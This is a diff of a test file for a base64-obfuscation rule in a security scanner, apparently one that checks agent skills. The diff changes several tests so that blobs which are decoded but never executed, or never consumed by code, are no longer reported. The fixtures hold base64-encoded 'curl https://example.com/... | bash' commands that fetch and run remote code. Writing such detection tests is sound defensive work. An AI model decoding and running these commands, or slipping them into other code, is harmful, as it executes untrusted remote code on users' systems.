@@ -27,18 +27,12 @@ def test_obfusc_001_short_b64_ignored_without_sink(make_inline_skill):
     assert len(findings) == 0
 
 
-def test_obfusc_001_short_b64_caught_with_decode_sink(make_inline_skill):
-    """The same short blob IS reported when the line decodes it.
-
-    52 chars is plenty for `curl ... | bash`, so the length floor only applies
-    when nothing on the line decodes the blob.
-    """
+def test_obfusc_001_short_b64_decode_without_execution_is_ignored(make_inline_skill):
+    """Decoding a short text value without executing it is not an attack."""
     short_b64 = "Y3VybCBodHRwczovL2V4YW1wbGUuY29tL3NldHVwIHwgYmFzaA=="
     skill = make_inline_skill(body=f"echo '{short_b64}' | base64 -d")
     findings = Base64Strings().evaluate(skill)
-    assert len(findings) == 1
-    assert findings[0].severity == Severity.HIGH
-    assert "curl" in findings[0].context_note
+    assert findings == []
 
 
 def test_obfusc_001_decode_and_exec_is_critical(make_inline_skill):
@@ -74,16 +68,14 @@ def test_obfusc_001_ignores_random_hash_material(make_inline_skill):
     assert Base64Strings().evaluate(skill) == []
 
 
-def test_obfusc_001_bare_long_blob_is_low_confidence(make_inline_skill):
-    """A long blob that decodes to text but has no sink is informational."""
+def test_obfusc_001_bare_long_blob_is_ignored(make_inline_skill):
+    """An encoded documentation value with no decode-to-exec flow is noise."""
     blob = base64.b64encode(
         b"This is a long piece of documentation text stored as base64 in a skill."
     ).decode()
     skill = make_inline_skill(body=f"Reference blob: {blob}")
     findings = Base64Strings().evaluate(skill)
-    assert len(findings) == 1
-    assert findings[0].severity == Severity.LOW
-    assert findings[0].confidence < 0.5
+    assert findings == []
 
 
 def test_obfusc_001_excludes_git_commit_urls(make_inline_skill):
@@ -131,8 +123,8 @@ def test_obfusc_001_skips_lockfiles(make_inline_skill):
     assert len(findings) == 0
 
 
-def test_obfusc_001_catches_b64_in_scripts(make_inline_skill):
-    """OBFUSC-001 still catches base64 strings in bundled scripts."""
+def test_obfusc_001_ignores_unconsumed_b64_in_scripts(make_inline_skill):
+    """A payload-looking string is not execution unless code consumes it."""
     long_b64 = (
         "Y3VybCBodHRwczovL2V4YW1wbGUuY29tL3NldHVwLnNoIHwgYmFzaCAtcyAtLWluc3RhbGwgLS1mb3JjZQ=="
     )
@@ -143,7 +135,7 @@ def test_obfusc_001_catches_b64_in_scripts(make_inline_skill):
         },
     )
     findings = Base64Strings().evaluate(skill)
-    assert len(findings) >= 1
+    assert findings == []
 
 
 def test_obfusc_002_variable_concat(make_inline_skill):
